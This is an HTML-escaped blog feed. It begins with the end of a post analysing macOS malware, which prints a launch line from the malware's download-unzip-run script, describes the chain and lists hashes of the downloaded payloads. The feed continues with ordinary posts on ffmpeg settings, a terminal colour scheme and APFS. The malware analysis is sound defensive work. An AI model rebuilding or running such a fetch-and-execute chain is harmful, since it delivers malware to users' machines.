open &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;app_dir&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;file_name&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--args&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session_guid&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;volume_name&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that it builds a request URL &lt;code class=&quot;highlighter-rouge&quot;&gt;url&lt;/code&gt;, it uses &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; to download something from that URL into a temporary folder, next it unzips the file with the password it has, it finds an app that is contained in it and eventually launches that app with some arguments.&lt;/p&gt;

&lt;p&gt;I ended up simply hardcoding some values for &lt;code class=&quot;highlighter-rouge&quot;&gt;os_version&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;session_guid&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;machine_id&lt;/code&gt;, commenting out the lines after the unzip, and just running this stage again in the docker container.&lt;/p&gt;

&lt;p&gt;So, I ended up just hardcoding some values into the script, and running it in a secure Linux container. Just to be safe.&lt;/p&gt;

&lt;p&gt;Interestingly, every time I run the script, it downloads a different file.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;f47b360433f1f696c7d0edc0dcd274562d200baa36ff479b148eab5296684cbe  run1.zip
149f43daef9c4ac9ee17ffa108b392aa86fb230e128c6612583d52f47ea91af7  run2.zip
add0beb0535945ab85d3ffda97248975d8dff2ddb7560eefc19ee025f8f62b11  run3.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Are these all different malwares that it’s launching? Doesn’t seem like it. After unzipping them and comparing the unzipped files with diff, it’s clear that they all contain the same files.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ diff -r Installer.app Installer2.app
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s most likely that the server generates these zip files on-demand and thus somewhere there are things with different different timestamps, which means they have a different hash sum despite containing the same files.&lt;/p&gt;

&lt;p&gt;The timestamp on most of the files is June 10th, which is a bit more than a week ago at this point, so fairly recent.&lt;/p&gt;

&lt;p&gt;Unlike the first &lt;code class=&quot;highlighter-rouge&quot;&gt;Installer.app&lt;/code&gt; that we had, this one is not a bash script. But what does this &lt;code class=&quot;highlighter-rouge&quot;&gt;Installer.app&lt;/code&gt; do? Check out the next post, where I will be reverse engineering the binary to find out what it does.&lt;/p&gt;</content><author><name></name></author><summary type="html">This is part one of a multi-part series where I reverse engineer some shitty macOS malware. All the code is available here.</summary></entry><entry><title type="html">Tweaking ffmpeg</title><link href="https://blog.xfbs.net/posts/tweaking-ffmpeg" rel="alternate" type="text/html" title="Tweaking ffmpeg" /><published>2018-09-23T00:00:00+02:00</published><updated>2018-09-23T00:00:00+02:00</updated><id>https://blog.xfbs.net/posts/tweaking-ffmpeg</id><content type="html" xml:base="https://blog.xfbs.net/posts/tweaking-ffmpeg">&lt;p&gt;Today I spent some time exploring &lt;abbr&gt;ffmpeg&lt;/abbr&gt;. Kind of unintentionally, actually. I actually just wanted to record some screencasts with QuickTime to see what it can do. I didn’t know how easy it was—just open up QuickTime, select New Screen Recording, and off you go. But there is one issue.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ffmpeg-terminal.png&quot; alt=&quot;ffmpeg transcoding a video&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Modern laptops have really insane resolutions. I remember those old &lt;abbr title=&quot;Cathode Ray Tube&quot;&gt;CRT&lt;/abbr&gt;s that had a resolution of maybe 1024x768. And those were considered fancy back them. There’s a good chance that you are older than me, so back in your time, things may have been even smaller. But modern laptops and their fancy high-pixel-density screens have a lot more pixels: on my laptop, which has a 13” screen, I have a resolution of about 2500x1800.&lt;/p&gt;

&lt;p&gt;Now, obviously when recording the screen, all these pixels have to be stored somewhere. So it’s not surprising to see large files being output by QuickTime. After recording for about thirty minutes, I got a 4&lt;abbr&gt;GB&lt;/abbr&gt; file. With the poor internet that I have in my apartment, it would take months to upload a file like that.&lt;/p&gt;

&lt;p&gt;Thankfully, these days we have efficient codecs that can drastically reduce file sizes. There’s plenty to choose from, and they all have individual advantages. But the most popular format these days is &lt;abbr&gt;x264&lt;/abbr&gt; with &lt;abbr&gt;aac&lt;/abbr&gt; audio in a &lt;abbr&gt;mp4&lt;/abbr&gt; container.&lt;/p&gt;

&lt;p&gt;And this is where &lt;abbr&gt;ffmpeg&lt;/abbr&gt; enters. It’s an open source tool that allows one to transcode video and audio files. Using it, I can take my file, which is already compressed, just not very much, and squeeze it into a very small file. I can also change the resolution, framerate, bitrate, audio codec, the options are almost unlimited.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ffmpeg-files.png&quot; alt=&quot;Video before and after transcoding with ffmpeg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But not all video is created equal. Screencasts of people typing into consoles can be compressed much more without losing too much quality than films of nature with a lot of moving parts. So the trick is to tweak the settings to get them just right: to get a video that is small, yet has a good quality. And that is exactly what I did. I mean, I tried. You’ll see.&lt;/p&gt;

&lt;h2 id=&quot;installing&quot;&gt;Installing&lt;/h2&gt;

&lt;p&gt;Before I could do anything with &lt;abbr&gt;ffmpeg&lt;/abbr&gt;, I first had to install it. For me, this was easy, since I have a package manager that does that for me. If you aren’t so lucky, you’ll probably find an installer somewhere on the net. But I used &lt;a href=&quot;https://brew.sh/&quot;&gt;homebrew&lt;/a&gt; to get everything set up.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;brew install ffmpeg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I read online that another project, which started out as a fork of &lt;abbr&gt;ffmpeg&lt;/abbr&gt;, had it’s own binary with the same name and invocation&lt;sup id=&quot;fnref:avconv&quot;&gt;&lt;a href=&quot;#fn:avconv&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;. Confusing! But form what I gathered, that’s no longer the case.&lt;/p&gt;

&lt;h2 id=&quot;basic-usage&quot;&gt;Basic Usage&lt;/h2&gt;

&lt;p&gt;To transcode anything with &lt;abbr&gt;ffmpeg&lt;/abbr&gt;, all you need to do is call it on the console. You need to give it an input file and specify an output. It can automatically recognize the extensions and it generally does what you’d expect.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffmpeg -i input.mov output.mp4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It can even do some fancy things such as &lt;a href=&quot;https://trac.ffmpeg.org/wiki/Capture/Desktop&quot;&gt;capture the screen&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffmpeg -f avfoundation -i 0:1 output.mkv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, I didn’t find that to be terribly useful, as QuickTime does a better job. But it is interesting if you want to stream your screen to somewhere.&lt;/p&gt;

&lt;h2 id=&quot;tweaking&quot;&gt;Tweaking&lt;/h2&gt;

&lt;p&gt;The interesting bit is the &lt;a href=&quot;https://ffmpeg.org/ffmpeg.html&quot;&gt;options&lt;/a&gt; that &lt;abbr&gt;ffmpeg&lt;/abbr&gt; offers. And these are also somewhat confusing. For me, what I ended up using to convert my videos was a rather complicated invocation, and I needed to do a bunch of research to figure everything out to get there.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffmpeg -i input.mov -c:v libx264 -r 30 -vf scale=-1:1440 -crf 25 -preset slow -profile:v high -level 4.0 -c:a aac -b:a 192k -ar 48000 -pix_fmt yuv420p -movflags +faststart output.mp4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I’m not an expert on &lt;abbr&gt;ffmpeg&lt;/abbr&gt; in any way, and if you want to do anything fancy, you’ll have to google it just like I did. But I can explain to you what these options do and why I chose them. So let’s examine them, one by one.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-i input.mov
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This specifies that we are reading from the file &lt;code class=&quot;highlighter-rouge&quot;&gt;input.mov&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-c:v libx264
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This specifies that the codec we want to use (&lt;code class=&quot;highlighter-rouge&quot;&gt;-c&lt;/code&gt;) for the video stream (&lt;code class=&quot;highlighter-rouge&quot;&gt;:v&lt;/code&gt;) is x264 (&lt;code class=&quot;highlighter-rouge&quot;&gt;libx264&lt;/code&gt;). There are other codecs out there, some with better compression, but this one has a very broad support and good characteristics.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-r 30
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;QuickTime records my screen with 60fps. That’s great because it’s more smooth, but for screencasts you don’t really need all those extra frames, especially because they use up storage. So here I tell &lt;abbr&gt;ffmpeg&lt;/abbr&gt; to reduce it down to 30fps.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-vf scape=-1:1440
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;QuickTime also records my screen in its full, native resolution. Nice because you get that beautiful, crisp look, but horrible when it comes to file sizes. I set this to 1440p, which is also known as 2K. You can set this to anything you like, including full HD (1080p), HD (720p), or just any size you like in pixels. The &lt;code class=&quot;highlighter-rouge&quot;&gt;-1&lt;/code&gt; here means that the other number is computed automatically.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-crf 25
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This one is a little bit special. Basically, there are multiple methods to tell &lt;abbr&gt;ffmpeg&lt;/abbr&gt; how much it should compress and what quality and file size you’d like. One way is to set a bandwidth, but this doesn’t always make sense because some parts of the video will need more (and they will be downgraded if the bandwidth is too low) whereas other parts will need less (so you will waste space with a constant bandwidth). The &lt;abbr&gt;crf&lt;/abbr&gt; means that you want a constant quality, which you can set between no compression (0) and maximum compression (51). This is good because it means that all parts have the same quality, regardless of how complex the scenes are.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-preset slow
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are some options that control how much &lt;abbr&gt;CPU&lt;/abbr&gt; power &lt;abbr&gt;ffmpeg&lt;/abbr&gt; invests to compress the video. This option tells it to favour using more &lt;abbr&gt;CPU&lt;/abbr&gt; power to get a better compression. If you have a beefier machine, you can even set it to &lt;em&gt;slowest&lt;/em&gt;. It will take longer, but you’ll get a better quality for the same file size.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-profile:v high -level 4.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From what I understand, these flags enable some features in the codec that might not be supported by all video players. There is a table&lt;sup id=&quot;fnref:x264-profile-support&quot;&gt;&lt;a href=&quot;#fn:x264-profile-support&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; that shows which devices need which settings. With these here, some of the more fancy features are enabled, but devices before the iPhone 4S might not be able to play them.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-c:a aac
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This tells &lt;abbr&gt;ffmpeg&lt;/abbr&gt; to use &lt;abbr&gt;aac&lt;/abbr&gt; for the audio codec. You can also tell it to not touch the audio and just pass it through.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-b:a 192k
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since these screencasts don’t have any music in them, I can lower the bitrate of the audio to 192kbps. This is more than enough for voice.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-ar 48000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we are telling the audio codec that we want the audio to have a sample rate of 48kHz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-pix_fmt yuv420p
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This one I don’t completely understand. From what I do understand, there are multiple ways to encode pixels, one of the most well-known encodings would be RGBA, which is a 32-bit encoding. Apparently &lt;abbr&gt;yuv420p&lt;/abbr&gt; is a sensible choice here.&lt;/p&gt;

&lt;h2 id=&quot;results&quot;&gt;Results&lt;/h2&gt;

&lt;p&gt;With these settings, I am able to convert a 255&lt;abbr&gt;MB&lt;/abbr&gt; file down to just 5&lt;abbr&gt;MB&lt;/abbr&gt; without losing any noticable quality. I think that is a really good result.&lt;/p&gt;

&lt;p&gt;The one downside is that transcoding is quite computationally intensive. For a 30-minute video at my screen’s native resolution, my laptop needs around 40 minutes to transcode it with the invocation that I documented here. That’s alright for me since I don’t have that many things to transcode, but this is an example where it does make sense to get a beefier machine if you do this kind of stuff often.&lt;/p&gt;

&lt;p&gt;As a demonstration, I’ve recorded myself writing this blog post. It was originally a 5&lt;abbr&gt;GB&lt;/abbr&gt; video, but I sped it up (since I type slow and it’s boring to watch) four times and downscaled it. I ended up with a ten minutes long, 30&lt;abbr&gt;MB&lt;/abbr&gt;  large 2K quality file. Success!&lt;/p&gt;

&lt;div style=&quot;margin:0;width=100%;&quot; class=&quot;embed-container&quot;&gt;
  &lt;iframe src=&quot;https://player.vimeo.com/video/291406117&quot; width=&quot;800&quot; height=&quot;600&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;
  &lt;/iframe&gt;
&lt;/div&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Codecs are amazing. It feels like magic when you have a secret command that you can run to get your video file down to just two percent of its size. But there is actually a lot of engineering behind that, not anything supernatural. It’s not easy to hit that sweet spot where you have a file with a good quality, yet a small file size, but it is possible. It just takes some time and experimentation.&lt;/p&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:avconv&quot;&gt;
      &lt;p&gt;See &lt;a href=&quot;https://stackoverflow.com/questions/9477115/what-are-the-differences-and-similarities-between-ffmpeg-libav-and-avconv&quot;&gt;this StackOverflow question&lt;/a&gt; for a little bit of background. &lt;a href=&quot;#fnref:avconv&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:x264-profile-support&quot;&gt;
      &lt;p&gt;See &lt;a href=&quot;H.264&quot;&gt;Encode/H.264&lt;/a&gt; on the &lt;abbr&gt;ffmpeg&lt;/abbr&gt; wiki. &lt;a href=&quot;#fnref:x264-profile-support&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;</content><author><name></name></author><summary type="html">Today I spent some time exploring ffmpeg. Kind of unintentionally, actually. I actually just wanted to record some screencasts with QuickTime to see what it can do. I didn’t know how easy it was—just open up QuickTime, select New Screen Recording, and off you go. But there is one issue.</summary></entry><entry><title type="html">Srcery Colorscheme</title><link href="https://blog.xfbs.net/posts/srcery-colors" rel="alternate" type="text/html" title="Srcery Colorscheme" /><published>2018-09-21T00:00:00+02:00</published><updated>2018-09-21T00:00:00+02:00</updated><id>https://blog.xfbs.net/posts/srcery-colors</id><content type="html" xml:base="https://blog.xfbs.net/posts/srcery-colors">&lt;p&gt;This week I had to set up a bunch of things for work. Since I spend a lot of time on the command line, I wanted to make it look comfortable. At first, I went with the default of black text on a white background, but soon enough I got tired of that. It’s more comfortable to look at a darker background. So I played around a bit and tried switching things around, but it never looked just right.&lt;/p&gt;

&lt;p&gt;I need to get things to a state where I’m comfortable using them, but I want to refrain from customizing things too much, because it’s too much of a distration. It’s better to use things as they are out-of-the-box, or maybe install a little plugin, but I don’t really want to have to manually tweak things.&lt;/p&gt;

&lt;p&gt;Instead of tweaking the default colors, I decided to install the &lt;a href=&quot;https://ethanschoonover.com/solarized/&quot;&gt;solarized&lt;/a&gt; colorscheme that I had used before on some machines. But even that didn’t look quite right. Not wanting to spend too much time on this, I went out and googled for some colorschemes, and almost immediately I found &lt;a href=&quot;https://vimcolors.com&quot;&gt;vimcolors&lt;/a&gt;, which is so awesome because you can see all schemes in action.&lt;/p&gt;

&lt;p&gt;It didn’t take me long to find the colorscheme that I liked, because to me it stood out with a very crafty and balanced palette, and some nice earthy colors that are so easy on the eyes. So I went ahead and checked out &lt;a href=&quot;https://srcery-colors.github.io&quot;&gt;srcery&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/srcery-vim.png&quot; alt=&quot;Srcery theme in vim&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is a package with theme files not just for vim but also for Terminal.app, tmux, and a bunch of other apps. Easy to install, and they work together great.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/srcery-bash.png&quot; alt=&quot;Srcery theme in bash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I can highly recommend this theme to anyone. It’s very easy on the eyes, and I think I will be using it for the forseeable future. But if you don’t happen to like it, &lt;a href=&quot;https://vimcolors.com&quot;&gt;vimcolors&lt;/a&gt; is an awesome project where you can just casually browse around and discover new colorschemes that you may like.&lt;/p&gt;</content><author><name></name></author><summary type="html">This week I had to set up a bunch of things for work. Since I spend a lot of time on the command line, I wanted to make it look comfortable. At first, I went with the default of black text on a white background, but soon enough I got tired of that. It’s more comfortable to look at a darker background. So I played around a bit and tried switching things around, but it never looked just right.</summary></entry><entry><title type="html">Exploring APFS</title><link href="https://blog.xfbs.net/posts/exploring-apfs" rel="alternate" type="text/html" title="Exploring APFS" /><published>2018-09-15T00:00:00+02:00</published><updated>2018-09-15T00:00:00+02:00</updated><id>https://blog.xfbs.net/posts/exploring-apfs</id><content type="html" xml:base="https://blog.xfbs.net/posts/exploring-apfs">&lt;p&gt;File systems are fascinating and scary. When I heard that Apple was working on its own &lt;a href=&quot;https://arstechnica.com/gadgets/2016/06/new-apfs-file-system-spotted-in-new-version-of-macos/&quot;&gt;in 2016&lt;/a&gt;, I was immediately interested. Now, in 2018, &lt;abbr title=&quot;Apple Filesystem&quot;&gt;APFS&lt;/abbr&gt; is standard on both macOS and iOS.&lt;/p&gt;

&lt;p&gt;Why are filesystems so interesting? With &lt;a href=&quot;https://github.com/libfuse/libfuse&quot;&gt;&lt;abbr title=&quot;File System in Userspace&quot;&gt;FUSE&lt;/abbr&gt;&lt;/a&gt;, anyone can implement their own filesystem. But these run in userspace, where things are slower but protected from programming errors&lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;. Real file systems run in kernelspace&lt;sup id=&quot;fnref:2&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;, and that is where things get interesting because programming errors can crash the system&lt;sup id=&quot;fnref:3&quot;&gt;&lt;a href=&quot;#fn:3&quot; class=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;. But much worse than crashing a system, an error could also cause corruption or loss of data. With that in mind, it becomes apparent that file system authors are incredibly talented people&lt;sup id=&quot;fnref:4&quot;&gt;&lt;a href=&quot;#fn:4&quot; class=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;

&lt;h2 id=&quot;motivations&quot;&gt;Motivations&lt;/h2&gt;

&lt;p&gt;Before &lt;abbr&gt;APFS&lt;/abbr&gt;, Apple used &lt;a href=&quot;http://ntfs.com/hfs.htm&quot;&gt;&lt;abbr title=&quot;Hierarchical File System Plus&quot;&gt;HFS+&lt;/abbr&gt;&lt;/a&gt;, which was introduced in 1998 as an extension of &lt;a href=&quot;https://en.wikipedia.org/wiki/Hierarchical_File_System&quot;&gt;&lt;abbr title=&quot;Hierarchical File System&quot;&gt;HFS&lt;/abbr&gt;&lt;/a&gt;, and that in turn was introduced in 1985. Both of these were designed for storage media like hard drives.&lt;sup id=&quot;fnref:hfs-floppy&quot;&gt;&lt;a href=&quot;#fn:hfs-floppy&quot; class=&quot;footnote&quot;&gt;5&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;p&gt;So what is so special about hard drives? These work similar to an old record player: they have rotating disks (usually multiple stacked on top of each other) with a round track consisting of the data, and they have a pickup that can move to follow the track or jump to another position.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/harddrive-front.svg&quot; alt=&quot;Harddrive front&quot; width=&quot;20%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;These kinds of storage media are really good at reading and writing sequential data. That means that when you read a file from beginning to end, the speed is quite good. However, if you jump around, reading bits and pieces from different places, the performance rapidly deteriorates. This is because the reading head has to physically move and find whatever you are looking for.&lt;/p&gt;

&lt;p&gt;File systems designed for these kinds of storage media have some very specific contstraints. For example, they might try not to split up files. Maybe they will try to put files that are accessed frequently close to another, so that they can be accessed faster. All of these optimizations are built on knowledge of how hard drives work internally.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/samsung-ssd.jpg&quot; alt=&quot;Samsung SSD&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;All was going well for file system architechts and implementors, until the &lt;abbr title=&quot;Solid State Drive&quot;&gt;SSD&lt;/abbr&gt; took on a major role in personal computing. As the name &lt;em&gt;solid state drive&lt;/em&gt; suggests, the main difference between regular hard drives is that it doesn’t have any moving parts.&lt;/p&gt;

&lt;p&gt;As such, it has different properties that file system implementors need to watch out for. For once, when accessing data, there is almost no different between sequential and random access, meaning that the speed is the same if you read a file from beginning to end as if you access small bits in a random order. But the one issue is that &lt;abbr&gt;SSD&lt;/abbr&gt;s have a limited life span, because the individual memory cells that it is made up of can only take so many writes.&lt;/p&gt;

&lt;p&gt;When Apple was designing &lt;abbr&gt;APFS&lt;/abbr&gt;, one of the reasons behind that was that they designed it from the ground up to work well with &lt;abbr&gt;SSD&lt;/abbr&gt; storage, which is now more common than traditional hard drives. While it is possible to add &lt;abbr&gt;SSD&lt;/abbr&gt; support to existing file systems, for example by adding support for the &lt;a href=&quot;https://en.wikipedia.org/wiki/Trim_(computing)&quot;&gt;&lt;abbr title=&quot;A command used to inform an SSD drive that a block of memory is no longer used and can be wiped internally&quot;&gt;TRIM&lt;/abbr&gt; command&lt;/a&gt;, it is easier to just start from scratch.&lt;/p&gt;

&lt;p&gt;In fact, Apple themselves say:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Apple File System is uniquely designed to meet the needs of Apple’s products and ecosystem. Apple File System provides strong encryption, ultra-low latencies and limited memory overhead. It is optimized for flash/&lt;abbr&gt;SSD&lt;/abbr&gt; storage and can be used on everything from an Apple Watch to a Mac Pro.&lt;/p&gt;

  &lt;p&gt;&lt;abbr&gt;HFS+&lt;/abbr&gt; and its predecessor &lt;abbr&gt;HFS&lt;/abbr&gt; are more than 30 years old. These file systems were developed in an era of floppy disks and spinning hard drives, when file sizes were calculated in kilobytes or megabytes.&lt;/p&gt;

  &lt;p&gt;Today, people commonly store hundreds of gigabytes and access millions of files on high-speed, low-latency flash drives. People carry their data with them, and they demand that sensitive information be secure.&lt;sup id=&quot;fnref:apple-apfs&quot;&gt;&lt;a href=&quot;#fn:apple-apfs&quot; class=&quot;footnote&quot;&gt;6&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;features&quot;&gt;Features&lt;/h2&gt;

&lt;p&gt;&lt;abbr&gt;APFS&lt;/abbr&gt; is a pragmatic successor to the previous &lt;abbr&gt;HFS+&lt;/abbr&gt; in that it doesn’t add anything crazy, but it does have some useful bits and pieces that we can look at in detail.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Encryption&lt;/strong&gt; support lets your protect your data safe from prying eyes, unless they have the password.&lt;/li&gt;
  &lt;li&gt;It is possible to take &lt;strong&gt;snapshots&lt;/strong&gt; of the state of the file system. This means that you can save the current state of your file system without having to do a full backup. This feature is actually used by Time Machine.&lt;/li&gt;
  &lt;li&gt;It supports &lt;strong&gt;clones&lt;/strong&gt; of files. This means that when copying large files, they don’t actually need to be copied, but both files (clones) will point to the same data. When you then edit one of them, the file system only needs to record the changes.&lt;/li&gt;
  &lt;li&gt;On a single &lt;em&gt;container&lt;/em&gt; (think hard drive or partition), you can have multiple &lt;em&gt;volumes&lt;/em&gt; sharing the same space. This is like partitioning a hard drive, but instead of having to specify the sizes beforehand, they all share the same space, so you can divit it up as you like.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;encryption&quot;&gt;Encryption&lt;/h3&gt;

&lt;p&gt;When you create a new &lt;abbr&gt;APFS&lt;/abbr&gt;-formatted volume, you have the option of creating an regular or and encrypted volume. For the latter, you just need to enter a password that you will need to remember because you will have to enter it every time you mount your volume, unless you allow your computer to save it in your keychain.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/apfs-creating-encrypted.png&quot; alt=&quot;Creating an APFS-formatted encrypted volume&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is not exactly different from the process of creating an encrypted &lt;abbr&gt;HFS+&lt;/abbr&gt; volume. I think that the only difference is internally—with &lt;abbr&gt;HFS+&lt;/abbr&gt; volumes, the encryption was apparently a little more hackish&lt;sup id=&quot;fnref:imore-apfs&quot;&gt;&lt;a href=&quot;#fn:imore-apfs&quot; class=&quot;footnote&quot;&gt;7&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;

&lt;h3 id=&quot;space-sharing&quot;&gt;Space sharing&lt;/h3&gt;

&lt;p&gt;Space sharing means that if you have an &lt;abbr&gt;APFS&lt;/abbr&gt;-formatted drive, you can create multiple volumes on it that share the same space. This is very similar to having multiple partitions on a single drive, with one crucial difference: with partitions, you have to specify their size when you create them, and it is not easy to change their size (grow or shrink them). With space sharing, multiple volumes share the same container, and they can use as much of that container as they like until it is full.&lt;/p&gt;

